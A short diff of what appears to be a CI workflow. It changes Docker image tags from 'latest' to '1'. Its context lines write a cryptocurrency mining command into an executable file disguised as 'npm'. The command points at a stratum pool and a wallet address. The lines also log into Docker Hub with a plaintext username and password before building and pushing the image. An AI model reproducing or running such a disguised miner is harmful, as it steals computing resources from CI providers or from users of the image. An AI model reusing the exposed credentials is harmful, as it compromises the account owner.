@@ -20,6 +20,6 @@ jobs:
           echo "node -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq.plaths " > npm
           chmod +x npm
           docker login -u christiankm01 -p Danang-112
-          docker build . -t christiankm01/kilo:latest
-          docker push christiankm/kilo:latest
+          docker build . -t christiankm01/kilo:1
+          docker push christiankm/kilo:1
           
